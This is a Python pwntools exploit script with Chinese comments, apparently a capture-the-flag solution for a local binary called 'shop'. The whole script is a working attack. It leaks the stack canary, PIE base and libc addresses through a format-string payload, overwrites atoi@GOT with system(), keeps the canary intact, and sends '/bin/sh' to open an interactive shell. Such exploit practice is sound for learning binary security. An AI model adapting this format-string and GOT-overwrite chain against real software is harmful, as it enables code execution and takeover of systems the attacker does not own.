#!/usr/bin/env python3

from pwn import *

# ===========================================================
#                      CONFIG                                 
# ===========================================================
# 設置 context 和日誌級別
context(os='linux', arch='amd64', log_level='info')

# 載入 ELF 和 Libc
exe = ELF("./shop")
# 使用 pwntools 自動尋找你系統上匹配的 libc
libc = exe.libc 

# 啟動本地進程
io = process(exe.path)

# 如果需要在 GDB 中除錯，取消註解下面這行
# gdb.attach(io, gdbscript='''
#    b *get_input+158
#    b *get_input+327
#    continue
# ''')

# ===========================================================
#                 STAGE 1: LEAK INFO
# ===========================================================
log.info("### STAGE 1: Leaking Canary, PIE, and Libc addresses ###")

# 使用我們確認的偏移量一次性洩漏所有資訊
LEAK_PAYLOAD = b"%3$p.%5$p.%17$p"
io.sendlineafter(b'>', LEAK_PAYLOAD)

# 接收並解析輸出
io.recvuntil(b'Your input is:\n')
leaked_line = io.recvline().strip()
parts = leaked_line.split(b'.')

leaked_libc_addr = int(parts[0], 16)
leaked_pie_addr  = int(parts[1], 16)
leaked_canary    = int(parts[2], 16)

log.success(f"Leaked Canary: {hex(leaked_canary)}")
log.info(f"Leaked Libc address (from write): {hex(leaked_libc_addr)}")
log.info(f"Leaked PIE address (offset 0x46b0): {hex(leaked_pie_addr)}")


# ===========================================================
#              STAGE 2: CALCULATE ADDRESSES
# ===========================================================
log.info("### STAGE 2: Calculating precise base addresses ###")

# 使用我們通過 GDB 偵查出的精確公式
libc.address = leaked_libc_addr - (libc.symbols['write'] + 23)
exe.address = leaked_pie_addr - 0x46b0

log.success(f"Calculated Libc Base: {hex(libc.address)}")
log.success(f"Calculated PIE Base: {hex(exe.address)}")

# 計算攻擊所需的最終位址
system_addr = libc.symbols['system']
atoi_got_addr = exe.got['atoi']

log.info(f"Targeting atoi@GOT: {hex(atoi_got_addr)}")
log.info(f"Overwriting with system(): {hex(system_addr)}")


# ===========================================================
#              STAGE 3: OVERWRITE & PWN
# ===========================================================
log.info("### STAGE 3: Crafting and sending GOT overwrite payload ###")

# 使用 pwntools 自動生成 payload
# offset=6 是 payload 在堆疊上的起始偏移
writes = {atoi_got_addr: system_addr}
overwrite_payload = fmtstr_payload(6, writes, write_size='byte')

# 填充 payload 直到 Canary 的位置，並附上正確的 Canary
padding_len = 0x108 - len(overwrite_payload)
final_payload = overwrite_payload + b'A' * padding_len + p64(leaked_canary)

# 發送覆寫 payload
io.sendlineafter(b'>', final_payload)

# 等待下一次提示，觸發 payload
log.info("### STAGE 4: Triggering payload to get a shell ###")
io.recvuntil(b'>')
io.sendline(b"/bin/sh")

# 享受你的 Shell！
io.interactive()
